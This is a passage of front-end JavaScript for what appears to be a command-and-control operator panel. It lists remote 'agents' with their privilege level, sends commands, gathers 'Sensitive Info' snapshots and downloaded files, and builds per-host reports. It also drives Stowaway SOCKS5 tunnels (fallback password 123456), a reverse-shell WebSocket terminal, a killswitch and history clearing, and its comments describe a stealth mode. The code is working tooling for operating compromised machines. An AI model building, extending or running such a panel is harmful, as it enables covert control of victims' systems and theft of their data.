    } else {
      toast(`${S.agents.length} agent(s) found`, "success");
    }
  } catch {
    S.agentsLoading = false;
    renderAgents();
    toast("Refresh failed", "error");
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = "🔄 刷新列表"; }
  }
}

// ── Dashboard: KPI stats + recent activity ─────────────────────────────────
// (vibeprompts.dev: dashboards-sidebar-stat-cards / dashboards-activity-feed-panel)

function _setText(id, v) {
  const el = document.getElementById(id);
  if (el) el.textContent = v;
}

async function loadStats() {
  try {
    const r = await fetch("/api/stats");
    if (!r.ok) return;
    const d = await r.json();
    _setText("ms-agents", d.agents_total ?? "–");
    _setText("ms-online", d.agents_online ?? "–");
    _setText("kpi-agents", d.agents_total ?? "–");
    _setText("kpi-agents-delta", `${d.agents_online ?? 0} online · ${d.agents_offline ?? 0} offline`);
    _setText("kpi-online", d.agents_online ?? "–");
    _setText("kpi-online-delta", `${d.agents_idle ?? 0} idle · ${d.agents_offline ?? 0} offline`);
    _setText("kpi-msgs", d.messages_24h ?? "–");
    _setText("kpi-msgs-delta", `共 ${d.messages_total ?? 0} 条消息`);
    _setText("kpi-cmds", d.commands_24h ?? "–");
    _setText("kpi-cmds-delta", `已索引文件 ${d.files_total ?? 0} 个`);
  } catch { /* stats are cosmetic — never block the UI */ }
}

function relTime(ts) {
  if (!ts) return "";
  const t = new Date(ts).getTime();
  if (isNaN(t)) return "";
  const s = Math.floor((Date.now() - t) / 1000);
  if (s < 0)    return "刚刚";
  if (s < 60)   return `${s} 秒前`;
  if (s < 3600) return `${Math.floor(s / 60)} 分钟前`;
  if (s < 86400) return `${Math.floor(s / 3600)} 小时前`;
  return new Date(ts).toLocaleDateString();
}

const ACT_META = {
  command:              { icon: "⌨", cls: "ev-cmd" },
  file_to_agent:        { icon: "📤", cls: "ev-cmd" },
  login:                { icon: "🔑", cls: "ev-sys" },
  login_failed:         { icon: "🚫", cls: "ev-err" },
  builder_build:        { icon: "🔨", cls: "ev-build" },
  stowaway_admin_start: { icon: "▶", cls: "ev-build" },
  stowaway_admin_stop:  { icon: "⏹", cls: "ev-err" },
  wsshell_start:        { icon: "🖥", cls: "ev-build" },
  wsshell_connect:      { icon: "⚡", cls: "ev-build" },
  wsshell_stop:         { icon: "✖", cls: "ev-err" },
  killswitch_activate:  { icon: "☠", cls: "ev-err" },
  history_clear:        { icon: "🗑", cls: "ev-err" },
};

function _shortId(id) {
  return id && id.length > 12 ? `${id.slice(0, 10)}…` : (id || "");
}

async function loadActivity() {
  const tl = document.getElementById("activity-timeline");
  if (!tl) return;
  try {
    const r = await fetch("/api/audit?limit=8");
    if (!r.ok) throw 0;
    const d   = await r.json();
    const es  = d.entries || [];
    if (!es.length) {
      tl.innerHTML = '<div class="activity-empty">暂无操作记录 — 配置通道并开始操作后，这里会显示时间线。</div>';
      return;
    }
    tl.innerHTML = es.map(e => {
      const m    = ACT_META[e.action] || { icon: "•", cls: "ev-sys" };
      const who  = esc(e.operator || "op");
      const obj  = e.agent_id ? `<span class="ev-obj">${esc(_shortId(e.agent_id))}</span>` : "";
      const quote = e.detail
        ? `<div class="ev-quote" title="${esc(e.detail)}">${esc(e.detail.slice(0, 120))}</div>`
        : "";
      return `
        <div class="activity-entry">
          <span class="ev-marker ${m.cls}">${m.icon}</span>
          <div class="ev-body">
            <div class="ev-line"><b>${who}</b> ${esc(e.action)} ${obj}<span class="ev-ts">${relTime(e.ts)}</span></div>
            ${quote}
          </div>
        </div>`;
    }).join("");
  } catch {
    tl.innerHTML = '<div class="activity-empty">活动加载失败</div>';
  }
}

function openAudit() {
  switchTab("settings");
  const d = document.getElementById("audit-section");
  if (d) {
    d.open = true;
    d.scrollIntoView({ behavior: "smooth", block: "start" });
    loadAudit();
  }
}

async function cleanupIssues() {
  const r = await fetch("/api/issues/cleanup", { method: "POST" });
  const d = await r.json();
  toast((d.results || []).join(" | ") || d.message || "Cleanup complete", "info");
}

// ── Internal send helper ───────────────────────────────────────────────────

async function sendRaw(cmd) {
  if (!S.selectedAgent) return;
  return fetch("/api/command", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ agent_id: S.selectedAgent.id, command: cmd }),
  });
}

// ── Utilities ──────────────────────────────────────────────────────────────

function esc(str) {
  // `'` must be escaped too: several onclick handlers embed values inside
  // single-quoted JS strings — a filename containing ' would otherwise break
  // the inline script (and give a stored-XSS foothold).
  return String(str ?? "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;")
    .replace(/>/g, "&gt;").replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function fmtSize(n) {
  if (n == null || isNaN(n)) return "? B";
  if (n < 1024)    return `${n} B`;
  if (n < 1048576) return `${(n/1024).toFixed(1)} KB`;
  return `${(n/1048576).toFixed(1)} MB`;
}

let _toastTimer;
function toast(msg, type = "info") {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.className   = `toast show ${type}`;
  clearTimeout(_toastTimer);
  _toastTimer = setTimeout(() => el.classList.remove("show"), 3500);
}

// ── xterm.js lazy loader ─────────────────────────────────────────────────────
// Only injected when Shell tab is opened for the first time.
// Loads LOCAL vendored copies first (offline/isolated labs work without any
// CDN access); falls back to the CDN only if the local files are missing.
let _xtermReady = false;
let _xtermLoading = null;   // in-flight Promise, prevents double-load

const XTERM_LOCAL = {
  css:  "/static/vendor/xterm/xterm.css",
  core: "/static/vendor/xterm/xterm.js",
  fit:  "/static/vendor/xterm/xterm-addon-fit.js",
};
const XTERM_CDN = {
  css:  "https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css",
  core: "https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js",
  fit:  "https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js",
};

function _loadScriptWithFallback(localSrc, cdnSrc) {
  return new Promise((resolve, reject) => {
    const s = document.createElement("script");
    s.src = localSrc;
    s.onload  = () => resolve();
    s.onerror = () => {
      // Local asset missing — try the CDN before giving up
      const c = document.createElement("script");
      c.src = cdnSrc;
      c.onload  = () => resolve();
      c.onerror = () => reject(new Error(`load failed: ${cdnSrc}`));
      document.head.appendChild(c);
    };
    document.head.appendChild(s);
  });
}

function _loadXterm() {
  if (_xtermReady) return Promise.resolve();
  if (_xtermLoading) return _xtermLoading;

  _xtermLoading = (async () => {
    // 1. CSS (local, CDN fallback is cosmetic-only — skip onerror here)
    const css = document.createElement("link");
    css.rel  = "stylesheet";
    css.href = XTERM_LOCAL.css;
    css.onerror = () => { css.href = XTERM_CDN.css; };
    document.head.appendChild(css);

    // 2. core, then 3. FitAddon (depends on core)
    await _loadScriptWithFallback(XTERM_LOCAL.core, XTERM_CDN.core);
    await _loadScriptWithFallback(XTERM_LOCAL.fit,  XTERM_CDN.fit);
    _xtermReady = true;
  })();

  return _xtermLoading;
}

// ── Init ───────────────────────────────────────────────────────────────────

async function loadVersion() {
  try {
    const r = await fetch("/api/version");
    if (!r.ok) return;
    const d = await r.json();
    const el = document.getElementById("build-id");
    if (!el) return;
    const rev = d.rev || "unknown";
    const when = (d.built_at || "").slice(0, 10);
    el.textContent = when ? `${rev} · ${when}` : rev;
    el.title = `rev=${rev} sha=${d.files_sha256 || "—"} poll=${d.always_poll ? "always" : "idle-90s"}`;
  } catch { /* footer is cosmetic */ }
}

(async () => {
  connectSSE();
  moveTabIndicator();
  loadStats();
  loadActivity();
  loadVersion();
  try {
    const r = await fetch("/api/agents?discover=1");
    const body = await r.json();
    S.agents = Array.isArray(body) ? body : (body.agents || []);
    if ((body.warnings || []).includes("worker_discovery_skipped_no_c2_password")) {
      toast("Worker 已配但解密密码为空，主通道发现已跳过。请到 Settings 填写控制器解密密码。", "error");
    }
  } catch {
    S.agents = [];
  }
  if (_authExpired) return;
  S.agentsLoading = false;
  renderAgents();
  updateTermStatus();
  // First-run convenience only: jump to Settings when nothing is configured.
  // (This used to run unconditionally, dumping operators with existing
  // agents onto the Settings tab on every page refresh.)
  if (!Array.isArray(S.agents) || S.agents.length === 0) {
    switchTab("settings");
  }
})();

// ── Library ────────────────────────────────────────────────────────────────

const LIB = {
  currentPath: null,
  currentName: null,
  currentIsText: false,
  unsaved: false,
  showPreview: false,
};

async function loadLibrary() {
  if (!S.selectedAgent) return;
  const r = await fetch(`/api/library/${S.selectedAgent.id}`);
  const d = await r.json();

  document.getElementById("lib-dir-path").textContent = d.dir || "—";

  const tree = document.getElementById("lib-tree-inner");
  if (!d.files || !d.files.length) {
    tree.innerHTML = '<div style="padding:16px;color:var(--text-muted);font-size:12px">No files yet</div>';
    return;
  }

  // Group by directory
  const groups = {};
  for (const f of d.files) {
    const dir = f.dir === "." ? "/" : f.dir;
    if (!groups[dir]) groups[dir] = [];
    groups[dir].push(f);
  }

  let html = "";
  for (const [dir, files] of Object.entries(groups).sort()) {
    html += `<div class="lib-group">
      <div class="lib-group-title">${esc(dir === "/" ? "📁 root" : "📁 " + dir)}</div>`;
    for (const f of files) {
      const icon   = f.is_note ? "📝" : (f.is_text ? "📄" : "📦");
      const active = LIB.currentPath === f.path ? " active" : "";
      // All files are clickable — click opens in right pane
      html += `<div class="lib-file-item${active}"
                    data-path="${esc(f.path)}" data-name="${esc(f.name)}"
                    data-text="${f.is_text}" data-note="${f.is_note}"
                    onclick="openFile('${esc(f.path)}','${esc(f.name)}',${f.is_text},${f.is_note})">
        <span class="lib-file-icon">${icon}</span>
        <span class="lib-file-name" title="${esc(f.path)}">${esc(f.name)}</span>
        <span class="lib-file-size">${fmtSize(f.size)}</span>
        <span class="lib-file-actions">
          <a href="/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(f.path)}?dl=1"
             download="${esc(f.name)}" onclick="event.stopPropagation()" title="Download">⬇</a>
          <span onclick="event.stopPropagation();libRename('${esc(f.path)}','${esc(f.name)}')" title="Rename">✎</span>
          <span onclick="event.stopPropagation();libDelete('${esc(f.path)}')" title="Delete">🗑</span>
        </span>
      </div>`;
    }
    html += `</div>`;
  }
  tree.innerHTML = html;
}

// Open any file in the right pane.
// Text → editor. Binary → info panel with download button.
async function openFile(path, name, isText, isNote) {
  if (!S.selectedAgent) return;

  if (LIB.unsaved && LIB.currentPath) {
    if (!confirm("Discard unsaved changes?")) return;
  }

  // Highlight active in tree
  document.querySelectorAll(".lib-file-item").forEach(el =>
    el.classList.toggle("active", el.dataset.path === path));

  LIB.currentPath   = path;
  LIB.currentName   = name;
  LIB.currentIsText = isText;
  LIB.unsaved       = false;
  LIB.showPreview   = false;

  document.getElementById("lib-editor-empty").style.display  = "none";
  document.getElementById("lib-editor-wrap").style.display   = "flex";
  document.getElementById("lib-binary-pane").style.display   = "none";
  document.getElementById("lib-text-pane").style.display     = "none";
  document.getElementById("lib-editor-title").textContent    = name;
  document.getElementById("lib-editor-status").textContent   = "";

  // Update header download link
  const dlBtn = document.getElementById("lib-header-dl");
  dlBtn.href     = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
  dlBtn.download = name;

  if (!isText) {
    // Binary file → show info pane only; user can download via the ⬇ button
    const url = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
    document.getElementById("lib-binary-pane").style.display = "flex";
    document.getElementById("lib-binary-name").textContent   = name;
    document.getElementById("lib-binary-path").textContent   = path;
    const dlLink = document.getElementById("lib-binary-dl");
    dlLink.href        = url;
    dlLink.download    = name;
    dlLink.textContent = "⬇ Download";
    document.getElementById("lib-md-toggle").style.display   = "none";
    document.getElementById("lib-save-btn").style.display    = "none";
    document.getElementById("lib-editor-status").textContent = "";
    return;
  }

  // Text file → editor
  const r = await fetch(`/api/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
  if (!r.ok) {
    const errData = await r.json().catch(() => ({}));
    if (r.status === 413) {
      // Too large to edit — show info pane with download only
      document.getElementById("lib-binary-pane").style.display = "flex";
      document.getElementById("lib-binary-name").textContent   = name;
      document.getElementById("lib-binary-path").textContent   = path;
      const dlLink = document.getElementById("lib-binary-dl");
      dlLink.href        = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}`;
      dlLink.download    = name;
      dlLink.textContent = "⬇ Download (file too large to edit)";
      document.getElementById("lib-md-toggle").style.display = "none";
      document.getElementById("lib-save-btn").style.display  = "none";
      document.getElementById("lib-editor-status").textContent = "⚠ File exceeds 512 KB edit limit";
      document.getElementById("lib-editor-status").style.color = "var(--yellow)";
    } else {
      toast(errData.error || "Cannot open file", "error");
    }
    return;
  }
  const d = await r.json();

  document.getElementById("lib-text-pane").style.display    = "flex";
  document.getElementById("lib-save-btn").style.display     = "inline-block";
  document.getElementById("lib-textarea").value             = d.content || "";
  document.getElementById("lib-textarea").style.display     = "block";
  document.getElementById("lib-md-preview").style.display   = "none";

  const mdToggle = document.getElementById("lib-md-toggle");
  mdToggle.style.display = path.endsWith(".md") ? "inline" : "none";
  document.getElementById("lib-preview-btn").textContent    = "👁 Preview";
}

function onEditorChange() {
  LIB.unsaved = true;
  document.getElementById("lib-editor-status").textContent = "● unsaved";
  document.getElementById("lib-editor-status").style.color = "var(--yellow)";
}

function handleEditorKey(e) {
  if ((e.ctrlKey || e.metaKey) && e.key === "s") {
    e.preventDefault();
    saveFile();
  }
  if (e.key === "Tab") {
    e.preventDefault();
    const ta = e.target;
    const start = ta.selectionStart;
    ta.value = ta.value.slice(0, start) + "  " + ta.value.slice(ta.selectionEnd);
    ta.selectionStart = ta.selectionEnd = start + 2;
    onEditorChange();
  }
}

async function saveFile() {
  if (!S.selectedAgent || !LIB.currentPath) return;
  const content = document.getElementById("lib-textarea").value;

  const r = await fetch(
    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(LIB.currentPath)}`,
    { method: "PUT", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }) }
  );
  const d = await r.json();

  if (d.deleted) {
    closeEditor(); loadLibrary();
    toast(d.message || "Empty note deleted", "info");
    return;
  }
  if (d.ok) {
    LIB.unsaved = false;
    document.getElementById("lib-editor-status").textContent = "✓ saved";
    document.getElementById("lib-editor-status").style.color = "var(--green)";
    loadLibrary();
  } else {
    toast(d.error || "Save failed", "error");
  }
}

function closeEditor() {
  if (LIB.unsaved && !confirm("Discard unsaved changes?")) return;
  LIB.currentPath = null;
  LIB.unsaved     = false;
  document.getElementById("lib-editor-empty").style.display = "flex";
  document.getElementById("lib-editor-wrap").style.display  = "none";
  document.querySelectorAll(".lib-file-item").forEach(el => el.classList.remove("active"));
}

function toggleMdPreview() {
  LIB.showPreview = !LIB.showPreview;
  const ta  = document.getElementById("lib-textarea");
  const pre = document.getElementById("lib-md-preview");
  const btn = document.getElementById("lib-preview-btn");
  if (LIB.showPreview) {
    // P2-12: sanitize markdown-rendered HTML to prevent stored XSS
    // (library notes are operator-authored but could contain injected HTML)
    let html = typeof marked !== "undefined"
      ? marked.parse(ta.value) : `<pre>${esc(ta.value)}</pre>`;
    html = html.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, "")
               .replace(/<iframe\b[^>]*>[\s\S]*?<\/iframe>/gi, "")
               .replace(/<object\b[^>]*>[\s\S]*?<\/object>/gi, "")
               .replace(/\son\w+\s*=\s*"[^"]*"/gi, "")
               .replace(/\son\w+\s*=\s*'[^']*'/gi, "");
    pre.innerHTML = html;
    ta.style.display  = "none";
    pre.style.display = "block";
    btn.textContent   = "✎ Edit";
  } else {
    ta.style.display  = "block";
    pre.style.display = "none";
    btn.textContent   = "👁 Preview";
  }
}

async function newNote() {
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  const r = await fetch(`/api/library/${S.selectedAgent.id}/note`, { method: "POST" });
  const d = await r.json();
  await loadLibrary();
  openFile(d.path, d.path.split("/").pop(), true, true);
  toast(`New note: ${d.path}`, "success");
}

async function newFile() {
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  const name = prompt("File name:", "newfile.txt");
  if (!name || !name.trim()) return;
  const fname = name.trim();
  const r = await fetch(
    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(fname)}`,
    { method: "PUT", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "" }) }
  );
  const d = await r.json();
  if (d.ok) {
    await loadLibrary();
    openFile(fname, fname, true, false);
    toast(`Created: ${fname}`, "success");
  } else {
    toast(d.error || "Failed to create file", "error");
  }
}

async function libRename(path, oldName) {
  if (!S.selectedAgent) return;
  const dir     = path.includes("/") ? path.slice(0, path.lastIndexOf("/") + 1) : "";
  const newName = prompt("Rename to:", oldName);
  if (!newName || newName.trim() === oldName) return;
  const newPath = dir + newName.trim();

  // Read old content
  const r1 = await fetch(`/api/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
  if (!r1.ok) { toast("Cannot read file for rename", "error"); return; }
  const { content } = await r1.json();

  // Write to new path
  const r2 = await fetch(
    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(newPath)}`,
    { method: "PUT", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }) }
  );
  const d2 = await r2.json();
  if (!d2.ok) { toast(d2.error || "Write failed", "error"); return; }

  // Delete old
  await fetch(
    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
    { method: "DELETE" }
  );

  if (LIB.currentPath === path) {
    LIB.currentPath = newPath;
    LIB.currentName = newName.trim();
    document.getElementById("lib-editor-title").textContent = newName.trim();
  }
  await loadLibrary();
  toast(`Renamed to ${newName.trim()}`, "success");
}

async function libUpload() {
  const input = document.getElementById("lib-upload-input");
  const file  = input.files[0];
  if (!file || !S.selectedAgent) return;
  const form = new FormData();
  form.append("file", file);
  toast(`Uploading ${file.name}…`, "info");
  const r = await fetch(`/api/library/${S.selectedAgent.id}/upload`, {
    method: "POST", body: form,
  });
  const d = await r.json();
  toast(d.ok ? `Uploaded: ${d.path}` : `Error: ${d.error}`,
        d.ok ? "success" : "error");
  if (d.ok) loadLibrary();
  input.value = "";
}

async function libDelete(path) {
  if (!confirm(`Delete ${path}?`)) return;
  if (LIB.currentPath === path) closeEditor();
  const r = await fetch(
    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
    { method: "DELETE" }
  );
  const d = await r.json();
  if (d.ok) { toast("Deleted", "success"); loadLibrary(); }
  else toast(d.error || "Delete failed", "error");
}

// Delete the file currently open in the editor
async function libDeleteCurrent() {
  if (!S.selectedAgent || !LIB.currentPath) return;
  if (!confirm(`Delete ${LIB.currentPath}?`)) return;
  const path = LIB.currentPath;
  closeEditor();
  const r = await fetch(
    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
    { method: "DELETE" }
  );
  const d = await r.json();
  if (d.ok) { toast("Deleted", "success"); loadLibrary(); }
  else toast(d.error || "Delete failed", "error");
}

// ── Report ─────────────────────────────────────────────────────────────────

let _reportData = null;

async function loadReport() {
  if (!S.selectedAgent) return;
  const el = document.getElementById("report-content");
  el.innerHTML = '<div style="color:var(--text-muted);padding:20px">Generating report…</div>';

  try {
    const r = await fetch(`/api/report/${S.selectedAgent.id}`);
    if (!r.ok) { el.innerHTML = `<div style="color:var(--red);padding:20px">Error ${r.status}: ${r.statusText}</div>`; return; }
    const text = await r.text();
    if (!text.trim()) {
      // 隐形模式：会话过期时 API 返回 200 空白 —— 引导重新登录而不是抛 JSON 错误
      el.innerHTML = `<div style="color:var(--yellow);padding:20px">会话已过期（响应为空）。请用 <code>?login=用户名&amp;pass=密码</code> 重新登录后刷新。</div>`;
      return;
    }
    _reportData = JSON.parse(text);
  } catch (e) {
    el.innerHTML = `<div style="color:var(--red);padding:20px">Network error: ${e}</div>`;
    return;
  }
  renderReport(_reportData);
  const si = document.getElementById("report-search");
  if (si) { si.value = ""; }
  const sc = document.getElementById("report-search-count");
  if (sc) sc.textContent = "";
}

// ── Report search / highlight ─────────────────────────────────────────────────
function reportSearch(query) {
  const content = document.getElementById("report-content");
  const countEl = document.getElementById("report-search-count");
  if (!content) return;

  // Remove old marks
  content.querySelectorAll("mark.rpt-hl").forEach(m => {
    m.replaceWith(document.createTextNode(m.textContent));
  });
  content.normalize();

  if (!query || query.length < 2) {
    if (countEl) countEl.textContent = query && query.length === 1 ? "≥2 chars" : "";
    return;
  }

  const pattern = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi");
  let count = 0;
  let firstMark = null;

  // Walk text nodes and wrap matches with <mark>
  const walker = document.createTreeWalker(content, NodeFilter.SHOW_TEXT, null);
  const nodesToProcess = [];
  let node;
  while ((node = walker.nextNode())) {
    if (pattern.test(node.textContent)) nodesToProcess.push(node);
    pattern.lastIndex = 0;
  }
  nodesToProcess.forEach(tn => {
    const frag = document.createDocumentFragment();
    let last = 0, m;
    pattern.lastIndex = 0;
    while ((m = pattern.exec(tn.textContent)) !== null) {
      frag.appendChild(document.createTextNode(tn.textContent.slice(last, m.index)));
      const mark = document.createElement("mark");
      mark.className = "rpt-hl";
      mark.textContent = m[0];
      frag.appendChild(mark);
      if (!firstMark) firstMark = mark;
      count++;
      last = pattern.lastIndex;
    }
    frag.appendChild(document.createTextNode(tn.textContent.slice(last)));
    tn.parentNode.replaceChild(frag, tn);
    pattern.lastIndex = 0;
  });

  if (countEl) countEl.textContent = count ? `${count}` : "0";
  if (firstMark) firstMark.scrollIntoView({ behavior: "smooth", block: "center" });
}

function renderReport(d) {
  const a   = d.agent || {};
  const el  = document.getElementById("report-content");

  const sec = (title, body) =>
    `<div class="rpt-section"><div class="rpt-section-title">${title}</div><div class="rpt-section-body">${body}</div></div>`;

  const table = rows => `<table class="rpt-table"><tbody>
    ${rows.map(([k,v]) => `<tr><td class="rpt-key">${k}</td><td class="rpt-val">${v}</td></tr>`).join("")}
    </tbody></table>`;

  const code = text => `<pre class="rpt-code">${esc(text || "—")}</pre>`;

  // Basic info
  const basicRows = [
    ["Hostname", esc(a.hostname || "?")],
    ["OS",       esc(a.os || "?")],
    ["Username", esc(a.username || "?")],
    ["Privilege", `<span class="${a.privilege==="root"?"rpt-root":"rpt-user"}">${esc(a.privilege||"?")}</span>`],
    ["Kernel",   esc(a.kernel || "?")],
    ["Arch",     esc(a.arch || "?")],
    ["Version",  esc(a.version || "?"), a.release_id ? ` <span class="rpt-ver-rel" title="发布标识">${esc(a.release_id)}</span>` : ""],
    ["Last Seen", esc(a.last_seen || "?")],
    ["Library",  `<code style="font-size:11px">${esc(d.library_dir||"")}</code>`],
  ];
  if (d.note) basicRows.push(["Note", `<em style="color:var(--accent)">${esc(d.note)}</em>`]);

  // Tunnel (Stowaway) section
  const tunnelSrvRunning = d.tunnel_server_running;
  const tunnelAgentActive = d.tunnel_agent_active;
  const socksPort  = esc(d.stowaway_socks || "1080");
  const tunnelIP   = esc(d.tunnel_ip || "");
  const listenPort = esc(d.tunnel_listen_port || "9998");
  const lastTunnelTs = esc(d.tunnel_agent_last_ts || "");

  let agentStateHtml;
  if (tunnelAgentActive) {
    agentStateHtml = `<span class="rpt-tunnel-active">🟢 Active</span>` +
      (lastTunnelTs ? `<span class="rpt-ts" style="margin-left:8px">since ${lastTunnelTs}</span>` : "");
  } else if (lastTunnelTs) {
    agentStateHtml = `<span class="rpt-tunnel-stopped">🔴 Stopped</span>` +
      `<span class="rpt-ts" style="margin-left:8px">last seen ${lastTunnelTs}</span>`;
  } else {
    agentStateHtml = `<span class="rpt-tunnel-none">⚫ Not deployed</span>`;
  }

  const tunnelRows = [
    ["Admin Server", tunnelSrvRunning
      ? `<span class="rpt-tunnel-active">🟢 Running</span><span class="rpt-ts" style="margin-left:8px">port ${listenPort}</span>`
      : `<span class="rpt-tunnel-stopped">⏹ Stopped</span>`],
    ["Agent Side", agentStateHtml],
  ];
  if (tunnelAgentActive && tunnelIP) {
    const su = esc(d.stowaway_socks_user || "s5admin");
    const sp = esc(d.stowaway_socks_pass || "123456");
    tunnelRows.push(["SOCKS5", `<code>${tunnelIP}:${socksPort}</code> — user: <code>${su}</code> pass: <code>${sp}</code>`]);
  } else if (!tunnelAgentActive && (tunnelIP || socksPort)) {
    tunnelRows.push(["SOCKS5 Config", `<code>${tunnelIP || "C2_SERVER"}:${socksPort}</code>`]);
  }

  // Command history — use response_to to link, fall back to command_history dict
  const cmdHistMap = d.command_history || {};
  const cmds = {};

  // First pass: collect all commands (from messages + from command_history)
  for (const m of d.messages || []) {
    if (m.is_command && m.command_id) {
      cmds[m.command_id] = { cmd: m.content, ts: m.timestamp, resps: [] };
    }
  }
  // Also include commands known from command_history but not in messages (e.g. Rust-sent)
  for (const [cid, ctxt] of Object.entries(cmdHistMap)) {
    if (!cmds[cid]) cmds[cid] = { cmd: ctxt, ts: "—", resps: [] };
  }
  // Second pass: attach responses
  for (const m of d.messages || []) {
    if (!m.is_command && m.response_to && cmds[m.response_to]) {
      cmds[m.response_to].resps.push(m.content);
    }
  }
  const orphans = (d.messages||[]).filter(m =>
    !m.is_command && m.response_to && !cmds[m.response_to]);

  let histHtml = "";
  const cmdList = Object.values(cmds);
  // Sort newest first (by timestamp descending, parse to Date for correctness)
  cmdList.sort((a, b) => {
    const ta = a.ts && a.ts !== "—" ? new Date(a.ts).getTime() : 0;
    const tb = b.ts && b.ts !== "—" ? new Date(b.ts).getTime() : 0;
    return tb - ta;
  });
  if (!cmdList.length && !orphans.length) {
    histHtml = '<div style="color:var(--text-muted)">No commands recorded</div>';
  } else {
    for (const item of cmdList) {
      histHtml += `<div class="rpt-cmd-block">
        <div class="rpt-cmd-line">
          <span class="rpt-cmd-text">&gt; ${esc(item.cmd)}</span>
          <span class="rpt-cmd-ts">${esc(item.ts)}</span>
        </div>
        ${item.resps.map(r => `<pre class="rpt-resp">${esc(r)}</pre>`).join("")}
      </div>`;
    }
    for (const m of orphans) {
      histHtml += `<div class="rpt-cmd-block">
        <div class="rpt-cmd-ts">[${esc(m.timestamp)}] ${esc(m.content)}</div>
      </div>`;
    }
  }

  // Downloaded files
  let dlHtml = d.downloaded_files?.length
    ? d.downloaded_files.map(f => `
        <div class="rpt-file-item">
          <span class="rpt-file-name">📦 ${esc(f.name)}</span>
          <code class="rpt-file-path">${esc(f.abs_path)}</code>
          <span class="rpt-file-meta">${fmtSize(f.size)} · ${esc(f.modified)}</span>
        </div>`).join("")
    : '<div style="color:var(--text-muted)">No files downloaded yet</div>';

  // Operator notes
  let notesHtml = d.operator_notes?.length
    ? d.operator_notes.map(n => `
        <div class="rpt-note-block">
          <div class="rpt-note-header">📝 ${esc(n.name)}
            <code style="font-size:10px;margin-left:8px">${esc(n.abs_path)}</code>
          </div>
          <div class="rpt-note-content">${esc(n.content)}</div>
        </div>`).join("")
    : '<div style="color:var(--text-muted)">No notes yet</div>';

  el.innerHTML = [
    sec("🖥 Basic Information", table(basicRows)),
    sec("🔗 Tunnel (Stowaway)", table(tunnelRows)),
    sec(`🔍 System Info <span class="rpt-badge">${d.sysinfo_snapshots} snapshots</span>`,
        d.sysinfo ? `<div class="rpt-ts">Collected: ${esc(d.sysinfo.collected_at)}</div>${code(d.sysinfo.content)}` : '<div style="color:var(--text-muted)">Not collected</div>'),
    sec(`🔑 Sensitive Info <span class="rpt-badge">${d.sensitive_snapshots} snapshots</span>`,
        d.sensitive ? `<div class="rpt-ts">Collected: ${esc(d.sensitive.collected_at)}</div>${code(d.sensitive.content)}` : '<div style="color:var(--text-muted)">Not collected</div>'),
    sec(`⌨ Command History <span class="rpt-badge">${cmdList.length} commands</span>`, histHtml),
    sec(`📥 Downloaded Files <span class="rpt-badge">${d.downloaded_files?.length||0} files</span>`, dlHtml),
    sec("📝 Operator Notes", notesHtml),
  ].join("") + `<div style="color:var(--text-muted);font-size:11px;margin-top:16px">Generated: ${esc(d.generated_at)}</div>`;
}

async function downloadReport(e) {
  e.preventDefault();
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  window.location = `/api/report/${S.selectedAgent.id}?fmt=md`;
}

// ── WS Shell ────────────────────────────────────────────────────────────────

const WSSHELL = {
    term: null,         // xterm.js Terminal instance
    ws: null,           // WebSocket to controller
    fitAddon: null,
    pollTimer: null,
    statusTimer: null,
    connected: false,
    boundAgent: null,   // 反弹会话所属 agent —— 切换 agent 时据此断开，屏幕上的终端永远属于当前选中项
    _disconnectCount: 0,
    _resizeObs: null,
    _listenersAttached: false,
};

// MAGIC_FLAG for resize: matches cliws [0x37, 0x37]
const WSSHELL_MAGIC = new Uint8Array([0x37, 0x37]);

function _wsshellUpdateAgentIndicator() {
    const a = S.selectedAgent;
    const el = document.getElementById("wsshell-agent-indicator");
    if (el) el.textContent = a ? `🎯 ${a.hostname || '?'} (${a.privilege || 'user'})` : "";
}

function _wsshellSetStatus(label, color) {
    const badge = document.getElementById("wsshell-status-badge");
    if (badge) { badge.textContent = label; badge.style.color = color || "var(--text-2)"; }
}

// ── WS Shell toolbar helpers ─────────────────────────────────────────────────

function _wsshellUpdateToolbar(backendActive, connected, waiting) {
    const startBtn   = document.getElementById("wsshell-start-btn");
    const stopBtn    = document.getElementById("wsshell-stop-btn");
    const connectBtn = document.getElementById("wsshell-connect-btn");
    const closeBtn   = document.getElementById("wsshell-close-btn");
    if (startBtn)    startBtn.style.display   = backendActive ? "none" : "inline-flex";
    if (stopBtn)     stopBtn.style.display    = backendActive ? "inline-flex" : "none";
    if (connectBtn)  connectBtn.style.display = (backendActive && !connected && !waiting) ? "inline-flex" : "none";
    if (closeBtn)    closeBtn.style.display   = connected ? "inline-flex" : "none";
}

function _wsshellUpdateTmuxBar(tmuxSession, attachCmd) {
    const bar = document.getElementById("wsshell-tmux-bar");
    if (!bar) return;
    if (tmuxSession && attachCmd) {
        document.getElementById("wsshell-tmux-name").textContent   = tmuxSession;
        document.getElementById("wsshell-tmux-attach").textContent = attachCmd;
